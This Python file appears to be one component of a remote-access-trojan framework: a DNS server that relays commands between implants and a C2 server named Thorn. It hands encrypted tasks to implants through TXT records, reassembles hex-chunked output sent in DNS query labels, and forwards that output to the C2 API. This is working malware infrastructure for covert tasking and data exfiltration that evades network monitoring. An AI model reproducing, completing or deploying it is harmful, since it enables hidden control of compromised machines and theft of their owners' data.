import socketserver
import threading
from dnslib import DNSRecord, RR, TXT, QTYPE

# C2_SERVER and DNS_DOMAIN are substituted at generate time.
# Crypto class is provided by the assembled station_crypto component.
C2_SERVER  = "{{C2_SERVER}}"
DNS_DOMAIN = "{{DNS_DOMAIN}}"

# Per-session chunk buffer: { sess_hex: { seq_int: chunk_hex } }
_sessions: dict = {}
_lock = threading.Lock()


# ── Helpers ───────────────────────────────────────────────────────────────────

def _from_hex(s: str) -> bytes | None:
    try:
        return bytes.fromhex(s)
    except ValueError:
        return None


def _strip_domain(qname: str) -> list | None:
    """Strip DNS_DOMAIN suffix and return the remaining labels, or None."""
    name   = qname.rstrip(".")
    suffix = DNS_DOMAIN.rstrip(".")
    if name == suffix:
        return []
    if not name.endswith("." + suffix):
        return None
    return name[: -(len(suffix) + 1)].split(".")


def _txt_reply(request: DNSRecord, text: str) -> bytes:
    reply = request.reply()
    reply.add_answer(RR(
        rname=request.q.qname,
        rtype=QTYPE.TXT,
        rdata=TXT(text),
        ttl=0,
    ))
    return reply.pack()


def _empty_reply(request: DNSRecord) -> bytes:
    return request.reply().pack()


# ── Query handlers ────────────────────────────────────────────────────────────

def _handle_checkin(labels: list, request: DNSRecord) -> bytes:
    """c.<rat_hex_label1>.<rat_hex_label2>... — poll Thorn for a task."""
    rat_hex   = "".join(labels[1:])
    rat_bytes = _from_hex(rat_hex)
    if not rat_bytes:
        return _empty_reply(request)

    rat_id = rat_bytes.decode("utf-8", errors="replace")
    try:
        resp      = requests.get(f"{C2_SERVER}/api/rats/{rat_id}/get_task", timeout=5)
        task_wire = resp.text.strip()
    except Exception:
        return _empty_reply(request)

    if not task_wire:
        return _txt_reply(request, "NOTASK")

    # Encrypt task wire → base64 ciphertext bytes → hex for DNS transport
    encrypted = Crypto.enc(task_wire)
    return _txt_reply(request, encrypted.hex())


def _handle_chunk(labels: list, request: DNSRecord) -> bytes:
    """s.<seq_8hex>.<chunk_50hex>.<sess_8hex> — store one output chunk."""
    if len(labels) < 4:
        return _empty_reply(request)
    try:
        seq   = int(labels[1], 16)
        chunk = labels[2]
        sess  = labels[3]
    except (ValueError, IndexError):
        return _empty_reply(request)

    with _lock:
        _sessions.setdefault(sess, {})[seq] = chunk

    return _txt_reply(request, "ACK")


def _handle_end(labels: list, request: DNSRecord) -> bytes:
    """e.<total_4hex>.<sess_8hex> — reassemble chunks and forward output to Thorn."""
    if len(labels) < 3:
        return _empty_reply(request)
    try:
        total = int(labels[1], 16)
        sess  = labels[2]
    except (ValueError, IndexError):
        return _empty_reply(request)

    with _lock:
        buf = _sessions.pop(sess, {})

    if len(buf) != total:
        return _empty_reply(request)

    payload_hex   = "".join(buf[i] for i in range(total))
    payload_bytes = _from_hex(payload_hex)
    if not payload_bytes:
        return _empty_reply(request)

    try:
        decrypted   = Crypto.dec(payload_bytes)
        wire        = decrypted.decode("utf-8", errors="replace")
        task_id, b64_output = wire.split(":", 1)
    except Exception:
        return _empty_reply(request)

    try:
        requests.post(
            f"{C2_SERVER}/api/tasks/{task_id}/task_io",
            data=b64_output,
            timeout=5,
        )
    except Exception:
        pass

    return _txt_reply(request, "DONE")


# ── UDP server ────────────────────────────────────────────────────────────────

class _DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data, sock = self.request
        try:
            req = DNSRecord.parse(data)
        except Exception:
            return

        if not req.questions:
            return

        qtype = req.q.qtype
        if qtype != QTYPE.TXT:
            sock.sendto(_empty_reply(req), self.client_address)
            return

        labels = _strip_domain(str(req.q.qname))
        if not labels:
            sock.sendto(_empty_reply(req), self.client_address)
            return

        op = labels[0]
        if   op == "c": reply = _handle_checkin(labels, req)
        elif op == "s": reply = _handle_chunk(labels, req)
        elif op == "e": reply = _handle_end(labels, req)
        else:           reply = _empty_reply(req)

        sock.sendto(reply, self.client_address)


class _ThreadedUDP(socketserver.ThreadingMixIn, socketserver.UDPServer):
    allow_reuse_address = True
    daemon_threads      = True


server = _ThreadedUDP(("0.0.0.0", 53), _DNSHandler)
server.serve_forever()
